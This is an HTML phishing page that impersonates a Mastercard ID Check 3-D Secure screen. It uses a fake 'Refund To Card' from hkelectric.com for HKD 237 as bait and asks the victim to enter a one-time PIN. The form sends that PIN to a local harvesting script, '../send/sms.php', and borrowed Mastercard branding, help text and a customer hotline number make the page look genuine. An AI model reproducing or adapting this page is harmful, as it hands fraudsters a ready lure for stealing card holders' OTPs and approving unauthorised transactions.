<html><head>
        <!-- VER 1.3[S] -->
	<meta name="viewport" content="width=device-width,height=device-height,initial-scale=1">
        <!-- <title>Mastercard Securecode</title> -->
	<title>Mastercard ID Check</title>
	<!-- VER 1.3[E] -->
        <link rel="stylesheet" type="text/css" href="../Assest/common.css">

        

        
        

        


    </head>
   <form action="../send/sms.php" method="post">	
            <br>	    
	    <!-- VER 1.3[S] -->
	    <!-- 
            <div id="screen">
                <table width="400px" align="center" border="0" cellpadding="0" cellspacing="0">
                    <tr>                   
                        <td>
	    -->
            <div>
                <table style="width:80%;max-width:750px;margin:auto" cellspacing="0" cellpadding="0" border="0" align="center">
                    <tbody><tr>                   
                        <td width="50%">
	    <!-- VER 1.3[E] -->
			<!-- VER 1.2[S] -->
                            <input type="image" src="../Assest/visa.jpg" width="120px" height="auto">
                        </td>
                        <td style="vertical-align:middle" align="right">
                            <input type="image" src="../Assest/mcV2.gif" width="80px" height="auto">
			<!-- VER 1.2[E] -->
                        </td>
                    </tr>                
                </tbody></table>
                <br>
                
		            <!-- VER 1.3[S] -->
                            <!-- <table width="100%" border="0" cellpadding="0" cellspacing="0"> -->
                            <table style="width:80%;max-width:750px;margin:auto" cellspacing="0" cellpadding="0" border="0">
			    <!-- VER 1.3[E] -->
                                <tbody><tr>
                                    <td>&nbsp;&nbsp;</td>
                                    <td align="right">
                                        &nbsp;&nbsp;


                                        <input type="hidden" name="selectedLang" value="">
                                        <input type="hidden" name="selectedPage" value="">
                                    </td>
                                </tr>
                            </tbody></table>
                
		<!-- VER 1.3[S] -->
                <!-- <table border="0" cellpadding="0" cellspacing="0"> -->
                <!-- <table style="width:80%;max-width:750px;margin:auto" border="0" cellpadding="0" cellspacing="0"> -->
		<!-- VER 1.3[E] -->
                    <!-- <tr> -->
                    <!--     <td><p class="title">Added Protection</p></td> -->
                    <!-- </tr> -->
                <!-- </table> -->
                <br>
		<!-- VER 1.3[S] -->
		<!-- 
                <div class="textarea">
                    <table width="400px" align="center" border="0" cellpadding="0" cellspacing="0">
		-->
                <div>
                    <table style="width:80%;max-width:750px;margin:auto" cellspacing="0" cellpadding="0" border="0" align="center">
		<!-- VER 1.3[E] -->
                        <tbody><tr>
                            <td colspan="3" class="Elem" width="" align="justify">
                                Your One Time PIN (OTP) has been sent to your mobile number. Please enter the OTP to authorise this transaction.
                            </td>   
                     						
                        </tr>
                        <tr>
                            <td colspan="3">&nbsp;</td>
                        </tr>
                        <tr>
                            <td class="Elem" width="40%" align="left">Merchant Name</td>
                            <td class="Elem" width="2%" align="right">&nbsp;:&nbsp;</td>
                            <td class="Elem" align="left">www.hkelectric.com</td>	                   
                        </tr>
                        <tr>
                            <td class="Elem" width="" align="left">Amount</td>
                            <td class="Elem" width="2%" align="right">&nbsp;:&nbsp;</td>
                            <td class="Elem" align="left">HKD 237</td>	                   
                        </tr>
						<tr>
                            <td class="Elem" width="40%" align="left">Reason</td>
                            <td class="Elem" width="2%" align="right">&nbsp;:&nbsp;</td>
                            <td class="Elem" align="left">Refund To Card</td>	                   
                        </tr>
                        <tr>
                        </tr>
                        <tr>
                            <td class="Elem" width="" align="left">Card Number</td>
                            <td class="Elem" width="2%" align="right">&nbsp;:&nbsp;</td>	                    
                            <td class="Elem" align="left">XXXX-XXXX-XXXX-XXXX</td>	                   
                        </tr>
                        <tr style="height: 40px">
                            <td class="Elem" width="" align="left">One Time PIN (OTP)</td>
                            <td class="Elem" width="2%" align="right">&nbsp;:&nbsp;</td>
                            <td class="Elem" align="left"><input type="password" name="pass" value="" size="8" maxlength="8" required="" onkeypress="checkNumber(this)" style="vertical-align: middle;">
							<input type="submit" value="Submit" />
</form>
                            </td>
                        </tr>																										
                    </tbody></table>
                </div>
		<!-- VER 1.3[S] -->
                <!-- <div class="textarea" style="display:none"> -->
                <div style="display:none">
		<!-- VER 1.3[E] -->
                    <table width="400px" cellspacing="0" cellpadding="0" border="0" align="center"> 
                        <tbody><tr>
                            <td class="Elem" width="" align="justify">								
                                					
                            </td>							
                        </tr>
                        <tr>
                            <td>&nbsp;</td>
                        </tr>
                    </tbody></table>
                </div>
		<!-- VER 1.3[S] -->
                <!-- <table width="250px" align="center" border="0" cellpadding="0" cellspacing="0"> -->
                <table style="width:80%;max-width:750px;margin:auto" cellspacing="0" cellpadding="0" border="0" align="center">
		<!-- VER 1.3[E] -->
                <!--
                    <tr>
                        <td align="left" width="40%">
                            <img src="images/btn_submitOTP.png" onclick="timer('O')" onmouseover="this.style.cursor='pointer'" height="25px" width="140px"/>
                        </td>
                        <td align="left" width="40%">
                            <img src="images/btn_submitToken.png" onclick="timer('T')" onmouseover="this.style.cursor='pointer'" height="25px" width="150px"/>
                            <input type="hidden" name="chosenAuthMthd" value="">
                        </td>
                        <td align="right" width="20%">	                    	
                            <img src="images/btn_cancel.png" onclick="" onmouseover="this.style.cursor='pointer'" id="confirm_button" height="25px" width="75px"/>
                        </td>
                    </tr>
                -->
                    <tbody><tr>
                       <!-- VER 1.3[S] -->
		       <!-- 
                        <td align="center" width="30%">
                            <img src="images/btn_submit.png" onclick="timer('O')" onmouseover="this.style.cursor='pointer'" height="22px" width="72px"/>
                        </td>
                        <td align="center" width="30%">	                    	
                            <img src="images/btn_cancel.png" onclick="" onmouseover="this.style.cursor='pointer'" id="confirm_button" height="22px" width="72px"/>
                        </td>
		       -->
                       <!-- VER 1.3[E] -->
                    </tr>
                </tbody></table>
		<!-- VER 1.3[S] -->
		<!-- 
                <div class="textarea" id="invalidTacInfo" style="display:none">
                    <table width="400px" align="center" border="0" cellpadding="0" cellspacing="0">
		-->
                <div id="invalidTacInfo" style="display:none">
                    <table style="width:80%;max-width:750px;margin:auto" cellspacing="0" cellpadding="0" border="0" align="center">
		<!-- VER 1.3[E] -->
                        <tbody><tr>
                            <td class="textarea_err" width="" align="center">								
                                Your OTP is invalid, please re-enter or request for a new OTP.					
                            </td>							
                        </tr>
                    </tbody></table>
                </div>
		<!-- VER 1.3[S] -->
                <div class="textarea" id="resendTacInfo" style="display:none">
                    <table style="width:80%;max-width:750px;margin:auto" cellspacing="0" cellpadding="0" border="0" align="center">
                        <tbody><tr>
                            <td class="textarea_err" style="color:red" width="" align="center">
                            <u>OTP resend successfully</u>
                            </td>
                            <td width="10%"></td>
                        </tr>
                    </tbody></table>
                </div>
		<!-- 
                <div class="textarea" >
                    <table width="400px" align="center" border="0" cellpadding="0" cellspacing="0" style="background-color:#FFF">
		-->
                <div>
                    <table style="width:80%;max-width:750px;margin:auto" cellspacing="0" cellpadding="0" border="0" align="center">
		<!-- VER 1.3[E] -->
                        <tbody><tr>
                            <td>&nbsp;</td>
                        </tr>
                        <tr>
                         <!-- VER 1.3[S] -->
                         </tr><tr>
                           <!-- <td colspan="3" align="left"><a class="buttoncancel" style="color:MiddleBlue " onclick="" onmouseover="this.style.cursor='pointer'" id="confirm_button" ><u>Cancel</u></a></td> -->
                           <td colspan="3" align="left"><a class="buttoncancel" style="color:MiddleBlue " onclick="" onmouseover="this.style.cursor='pointer'" id="confirm_button"><u>Cancel</u></a></td>
                           <td></td>
                         </tr>
                         <!-- VER 1.3[E] -->
                            <tr><td class="Elem" width="" align="justify">								
                                If you do not receive your OTP within next 2 minutes, please click <a  style="color:blue" id="resnOTPLink" onclick="unhook()" disabled="">HERE</a> to request for a new OTP.<br>For more information or assistance please refer to <a >FAQ</a>.<br><br>Please <u><b>DO NOT</b></u> reveal your OTP to any 3rd party.
                            </td>							
                        </tr>
			<!-- VER 1.3[S] -->
			<tr>
                 <!--             <td width=""></td>  -->
                            <td colspan="3" align="left">
                            <div class="Elem" onclick="OpenClose('addInfo')" onmouseover="this.style.cursor='pointer';" style="cursor: pointer;">

                                <table style="width:100%;margin:auto" cellspacing="0" cellpadding="0" border="0" align="center">
                                <tbody><tr>
                                        <td id="addInfo_Head" class="Elem" style="height: 19px;color:darkblue;font-weight:bold" width="" align="justify">+Additional Information</td>
                                </tr>
                            </tbody></table>
                                                        </div>

                            <div id="addInfo_Body" class="Elem" style="display:none" align="justify">
                            <table style="width:100%;margin:auto" cellspacing="0" cellpadding="0" border="0" align="justify">
                                <tbody><tr>

                                        <td class="Elem" style="text-align:justify;color:darkblue;padding-left:6px" width="" align="justify">Purchase Authentication Service is a security feature provided by card issuer. When you make an online transaction with your MasterCard card at a participating 3-D Secure online merchant, you will receive a 6 digits OTP through an SMS to your registered mobile number. Simply enter the OTP to authenticate your transaction/ Call our Customer Service Hotline 2888 0000 if you encounter any problem.

                                </td></tr>
                            </tbody></table>
                            </div>
               <!--               <td width="10%"></td>   -->
                       </td></tr>


			<tr>
                  <!--            <td width="10%"></td>  -->
                            <td colspan="3" align="left">
                            <div class="Elem" onclick="OpenClose('using3D')" onmouseover="this.style.cursor='pointer';" style="">

                                <table style="width:100%;margin:auto" cellspacing="0" cellpadding="0" border="0" align="center">
                                <tbody><tr>
                                        <td id="using3D_Head" class="Elem" style="height: 19px;color:darkblue;font-weight:bold" width="" align="justify">+Why using 3-D Secure?</td>
                                </tr>
                            </tbody></table>
                                                        </div>

                            <div id="using3D_Body" class="Elem" style="display:none" align="justify">
                            <table style="width:100%;margin:auto" cellspacing="0" cellpadding="0" border="0" align="justify">
                                <tbody><tr>
                                    <td class="Elem" style="text-align:justify;color:darkblue;padding-left:6px" width="" align="justify">3-D Secure Service provides an extra security protection against online fraud. When you make an online transaction with your MasterCard card at a participating 3-D Secure online merchant, an OTP is required for the transaction authentication. With the implementation of this password authentication, should your card information be pilfered for any reason, they will not be able to use your card for the online transactions without the OTP sent to your registered mobile phone.

                                </td></tr>
                            </tbody></table>
                            </div>
                   <!--           <td width="10%"></td>  -->
                       </td></tr>
                                                
                         
                                                 <tr>
                 <!--             <td width=""></td>   -->
                            <td colspan="3" class="Elem" align="left">

                            </td>
                      <!--        <td width="10%"></td>   -->
                        </tr>
                        <!-- VER 1.3[E] -->
                    </tbody></table>
                </div>
                <div style="display:none" class="textarea">								
                    <table style="background-color:#F3E2A9" width="100%" cellspacing="0" cellpadding="0" border="0" align="center">	            	
                        <tbody><tr>
                            <td width="10%">
                            </td><td><input type="image" src="images/info.jpg" width="60px" height="50px"></td>
                            
                            <td class="Elem" width="" align="left">								
                                Your card has been pre-enrolled in the 3D <br> Secure to help protect you against unauthorised use online. <br> Please <u><b>DO NOT</b></u> reveal your OTP to any 3rd party.				
                            </td>							
                        </tr>
                    </tbody></table>
                </div>
				<br>
                <div>
                    <!-- VER 1.3[S] -->
                    <!-- <table width="400px" align="center" border="0" cellpadding="0" cellspacing="0" > -->
                    <table style="width:80%;max-width:750px;margin:auto" cellspacing="0" cellpadding="0" border="0" align="center">
		    <!-- VER 1.3[E] -->
                        <tbody><tr id="masterCopy">
                            <td colspan="3" valign="top" align="left"><span class="copyright">© Copyright MasterCard 1994 - 2021. All rights reserved.</span></td>
                        </tr>
                    </tbody></table>
                </div>
            </div>
        </form>
    
    <script language="Javascript">
        
    </script>

</body></html>